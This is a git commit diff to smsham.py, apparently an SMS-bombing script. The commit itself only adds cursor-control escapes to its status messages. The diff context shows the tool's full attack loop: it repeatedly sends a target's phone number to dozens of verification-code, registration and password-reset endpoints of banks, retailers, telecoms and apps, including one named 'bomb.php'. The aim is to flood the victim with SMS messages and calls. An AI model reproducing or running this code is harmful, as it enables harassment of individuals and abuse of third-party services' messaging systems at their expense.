933cc90feea1a1c7a562a3c694ce81f9b5ca566d
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-01-17 23:07:59 +0300

    Update smsham.py

--- smsham.py
+++ smsham.py
@@ -63,345 +63,345 @@ while True:
 
 	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-		print('[+] Karusel отправлено!')
+		print('\033[F[+] Karusel отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-		print('[+] Tinkoff отправлено!')
+		print('\033[F[+] Tinkoff отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-		print('[+] MTS отправлено!')
+		print('\033[F[+] MTS отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-		print('[+] Youla отправлено!')
+		print('\033[F[+] Youla отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
-		print('[+] PizzaHut отправлено!')
+		print('\033[F[+] PizzaHut отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
-		print('[+] Rabota отправлено!')
+		print('\033[F[+] Rabota отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
-		print('[+] Rutube отправлено!')
+		print('\033[F[+] Rutube отправлено!')
 	except:
 		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
-		print('[+] Citilink отправлено!')
+		print('\033[F[+] Citilink отправлено!')
 
 	try:
 		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
-		print('[+] Smsint отправлено!')
+		print('\033[F[+] Smsint отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('[+] findclone звонок отправлен!')
+		print('\033[F[+] findclone звонок отправлен!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
-		print('[+] oyorooms отправлено!')
+		print('\033[F[+] oyorooms отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
-		print('[+] MVideo отправлено!')
+		print('\033[F[+] MVideo отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-		print('[+] newnext отправлено!')
+		print('\033[F[+] newnext отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
-		print('[+] Sunlight отправлено!')
+		print('\033[F[+] Sunlight отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-		print('[+] alpari отправлено!')
+		print('\033[F[+] alpari отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-		print('[+] Invitro отправлено!')
+		print('\033[F[+] Invitro отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
-		print('[+] Sberbank отправлено!')
+		print('\033[F[+] Sberbank отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
-		print('[+] Psbank отправлено!')
+		print('\033[F[+] Psbank отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-		print('[+] Beltelcom отправлено!')
+		print('\033[F[+] Beltelcom отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
-		print('[+] Karusel отправлено!')
+		print('\033[F[+] Karusel отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-		print('[+] KFC отправлено!')
+		print('\033[F[+] KFC отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
-		print('[+] carsmile отправлено!')
+		print('\033[F[+] carsmile отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
-		print('[+] Citilink отправлено!')
+		print('\033[F[+] Citilink отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
-		print('[+] Delitime отправлено!')
+		print('\033[F[+] Delitime отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('[+] findclone звонок отправлен!')
+		print('\033[F[+] findclone звонок отправлен!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
-		print('[+] Guru отправлено!')
+		print('\033[F[+] Guru отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-		print('[+] ICQ отправлено!')
+		print('\033[F[+] ICQ отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-		print('[+] InDriver отправлено!')
+		print('\033[F[+] InDriver отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
-		print('[+] Invitro отправлено!')
+		print('\033[F[+] Invitro отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('[+] findclone звонок отправлен!')
+		print('\033[F[+] findclone звонок отправлен!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
-		print('[+] Pmsm отправлено!')
+		print('\033[F[+] Pmsm отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-		print('[+] IVI отправлено!')
+		print('\033[F[+] IVI отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
-		print('[+] Lenta отправлено!')
+		print('\033[F[+] Lenta отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
-		print('[+] Mail.ru отправлено!')
+		print('\033[F[+] Mail.ru отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
-		print('[+] MVideo отправлено!')
+		print('\033[F[+] MVideo отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
-		print('[+] OK отправлено!')
+		print('\033[F[+] OK отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://plink.tech/register/',json={"phone": _phone})
-		print('[+] Plink отправлено!')
+		print('\033[F[+] Plink отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
-		print('[+] qlean отправлено!')
+		print('\033[F[+] qlean отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
-		print('[+] SMSgorod отправлено!')
+		print('\033[F[+] SMSgorod отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('[+] findclone звонок отправлен!')
+		print('\033[F[+] findclone звонок отправлен!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
-		print('[+] Tinder отправлено!')
+		print('\033[F[+] Tinder отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
-		print('[+] Twitch отправлено!')
+		print('\033[F[+] Twitch отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
-		print('[+] CabWiFi отправлено!')
+		print('\033[F[+] CabWiFi отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
-		print('[+] wowworks отправлено!')
+		print('\033[F[+] wowworks отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
-		print('[+] Eda.Yandex отправлено!')
+		print('\033[F[+] Eda.Yandex отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-		print('[+] Youla отправлено!')
+		print('\033[F[+] Youla отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
-		print('[+] Alpari отправлено!')
+		print('\033[F[+] Alpari отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
-		print('[+] SMS отправлено!')
+		print('\033[F[+] SMS отправлено!')
 	except:
-		print('[-] не отправлено!')
+		print('\033[F[-] не отправлено!')
 
 	try:
 		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-		print('[+] Delivery отправлено!')
+		print('\033[F[+] Delivery отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://findclone.ru/register', data={"phone": _phone})
-		print('[+] Findclone отправлено!')
+		print('\033[F[+] Findclone отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": _phone})
-		print('[+] apteka366 отправлено!')
+		print('\033[F[+] apteka366 отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": _phone})
-		print('[+] Fex отправлено!')
+		print('\033[F[+] Fex отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": _phone})
-		print('[+] ennergiia отправлено!')
+		print('\033[F[+] ennergiia отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('http://greadios.beget.tech/bomb.php', data={"number": _phone})
-		print('[+] greadios отправлено!')
+		print('\033[F[+] greadios отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://www.stoloto.ru/send-mobile-app-link', data={"phone": _phone})
-		print('[+] stoloto отправлено!')
+		print('\033[F[+] stoloto отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-		print('[+] findclone звонок отправлен!')
+		print('\033[F[+] findclone звонок отправлен!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 	try:
 		requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
-		print('[+] gorzdrav отправлено!')
+		print('\033[F[+] gorzdrav отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('\033[F[-] Не отправлено!')
 
 
 
 	try:
 		iteration += 1
-		print(('{}  Волна пройдена.').format(iteration))
+		print(('\033[F{}  Волна пройдена.').format(iteration))
 	except:
 		break
